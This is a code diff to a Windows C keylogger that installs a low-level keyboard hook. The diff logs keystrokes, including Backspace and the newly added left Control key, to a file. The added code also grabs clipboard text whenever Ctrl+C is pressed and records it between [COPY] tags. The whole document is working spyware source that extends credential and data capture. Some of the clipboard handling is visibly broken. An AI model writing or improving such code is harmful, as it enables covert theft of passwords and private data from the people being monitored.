@@ -1,6 +1,7 @@
 #include "winkey.h"
 #include <debugapi.h>
 #include <winbase.h>
+#include <winerror.h>
 
 // add this line or add user32.lib on Makefile
 //#pragma comment(lib, "user32.lib")
@@ -39,8 +40,12 @@ void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event
 
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
+
+    // kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);
+
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
     DWORD   kCode = 0;
+    // (void)GetClipboardData(NULL);
     if (wParam == WM_KEYDOWN)
     {
         char inputLog[64];
@@ -58,15 +63,17 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                 sprintf_s(inputLog, sizeof(inputLog), "[BACKSPACE]");
 				WriteToFile(inputLog);
                 break ;
+            case VK_LCONTROL:
+                sprintf_s(inputLog, sizeof(inputLog), "[LCTRL]");
+                WriteToFile(inputLog);
+                break ;
             default:
                 kCode = pkey->vkCode;
 				BYTE keyboardState[256];
 				GetKeyboardState(keyboardState);
-
 				// Convert the virtual key code to a character
 				WCHAR unicodeBuffer[5];
 				int res = ToUnicode(kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);
-
 				if (res > 0)
 				{
 					// Convert the wide character to UTF-8
@@ -76,10 +83,24 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 					if (bytesWritten > 0)
 						WriteToFile(utf8Buffer);
 				}
+                if (GetAsyncKeyState(VK_LCONTROL) && kCode == 'C') // c moche
+                {
+                    DBG("LCTRL + C");
+                    if (GetClipboardData(CF_TEXT) != 0)
+                        EmptyClipboard();
+                    if (!OpenClipboard(NULL))
+                        return 1;
+                    HANDLE clipB = GetClipboardData(CF_TEXT);
+                    if (!clipB)
+                        CloseClipboard();
+                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", (char*)GlobalLock(clipB));
+                    WriteToFile(inputLog);
+                    GlobalUnlock(clipB);
+                    CloseClipboard();
+                }
                 break ;
         }
     }
-
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
